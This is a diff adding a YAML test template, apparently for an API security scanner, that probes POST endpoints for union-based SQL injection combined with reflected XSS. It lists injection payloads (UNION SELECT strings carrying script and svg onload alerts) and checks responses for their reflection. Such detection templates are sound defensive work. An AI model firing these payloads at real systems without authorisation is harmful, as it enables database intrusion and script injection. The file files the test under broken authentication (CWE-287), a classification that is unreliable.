@@ -1,0 +1,186 @@
+id: UNION_BASED_SQLI_XSS_POST
+info:
+  name: "Union based SQL Injection Test with XSS for POST method APIs"
+  description: "Union Based SQL Injection Test with XSS for POST Method APIs is a security test that checks for the presence of both SQL injection and Cross-Site Scripting (XSS) vulnerabilities in web applications. The test involves injecting malicious SQL payloads that use the UNION operator to extract data while also embedding XSS scripts in the input fields. This can lead to unauthorized access to sensitive database information and the execution of scripts in the context of the user's browser, potentially compromising security and user data."
+  details: "Union Based SQL Injection Test with XSS for POST Method APIs targets web applications that accept user input via POST requests. It specifically tests for SQL injection vulnerabilities that allow attackers to combine results from multiple queries using the UNION operator, while simultaneously checking for XSS flaws by injecting malicious scripts. This test aims to exploit both database vulnerabilities and client-side scripting issues, posing a serious risk of data leakage and script execution in the user's browser. Successful exploitation could lead to unauthorized data access and compromised user interactions."
+  impact: "The impact of the Union Based SQL Injection Test with XSS for POST Method APIs can be severe. Successful exploitation of SQL injection could lead to unauthorized data access, manipulation, or deletion from the database. Additionally, XSS vulnerabilities could enable attackers to execute malicious scripts in users' browsers, potentially stealing sensitive data like session tokens or credentials. Combined, these vulnerabilities can compromise both server-side data integrity and client-side security, leading to significant data breaches, account takeovers, or further attacks."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_BASED_SQLI_XSS_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+api_selection_filters:
+  method:
+    eq: "POST"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionXSSPayloads:
+    - "' UNION SELECT null,null,'<script>alert(\"XSS\");</script>' --"
+    - "' UNION SELECT null,null,concat('<script>alert(\"XSS\");</script>') --"
+    - "' UNION SELECT null,null,'<svg/onload=alert(\"XSS\")>' --"
+    - "' UNION SELECT null,null,concat('<svg/onload=alert(\"XSS\")>') --"
+    - "' UNION SELECT null,null,null,'<script>alert(\"XSS\");</script>' --"
+    - "' UNION SELECT null,null,null,concat('<script>alert(\"XSS\");</script>') --"
+    - "' UNION SELECT null,null,null,'<svg/onload=alert(\"XSS\")>' --"
+    - "' UNION SELECT null,null,null,concat('<svg/onload=alert(\"XSS\")>') --"
+  unionXSSNegativePayloads:
+    - "' UNION SELECT null,null,'<script>alert(\"XSS\");</script>' WHERE 1=0--"
+    - "' UNION SELECT null,null,concat('<script>alert(\"XSS\");</script>') WHERE 1=0 --"
+    - "' UNION SELECT null,null,'<svg/onload=alert(\"XSS\")>' WHERE 1=0 --"
+    - "' UNION SELECT null,null,concat('<svg/onload=alert(\"XSS\")>') WHERE 1=0 --"
+    - "' UNION SELECT null,null,null,'<script>alert(\"XSS\");</script>' WHERE 1=0 --"
+    - "' UNION SELECT null,null,null,concat('<script>alert(\"XSS\");</script>') WHERE 1=0 --"
+    - "' UNION SELECT null,null,null,'<svg/onload=alert(\"XSS\")>' WHERE 1=0 --"
+    - "' UNION SELECT null,null,null,concat('<svg/onload=alert(\"XSS\")>') WHERE 1=0 --"
+execute:
+  type: multiple
+  requests:
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${unionXSSPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - "<script>alert(\"XSS\");</script>"
+            - "<svg/onload=alert(\"XSS\")>"
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - " UNION SELECT "          
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${unionXSSNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0 
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - " UNION SELECT "
+            - "<script>alert(\"XSS\");</script>"
+            - "<svg/onload=alert(\"XSS\")>"
+
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit                              
